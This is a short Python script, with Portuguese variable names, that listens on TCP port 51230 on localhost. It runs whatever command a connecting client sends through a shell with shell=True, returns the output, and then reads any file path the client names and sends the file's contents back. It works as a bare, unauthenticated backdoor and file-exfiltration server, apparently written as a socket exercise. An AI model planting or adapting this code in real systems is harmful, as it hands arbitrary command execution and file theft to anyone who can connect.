import socket
import subprocess

ip = "127.0.0.1"
porta = 51230

ojb_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ojb_con.bind((ip, porta))
ojb_con.listen(2)
print("Esperando Conexão")

while True:
    con, client = ojb_con.accept()
    print("Cliente conectado: ", client)

    while True:
        comando = con.recv(1024).decode(encoding="latin-1")
        print("Recebido: ", comando)
        output = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = output.communicate()
        resposta = stdout.decode(encoding="latin-1")

        msg_enviada = bytes(resposta, encoding="latin-1")
        con.send(msg_enviada)

        arquivo = con.recv(1024).decode(encoding="latin-1")
        print("Recebido: ", arquivo)
        with open(arquivo, "rb") as file:
            dados = file.read()
        
        con.send(dados)
        print("Terminou")
        break

    con.close()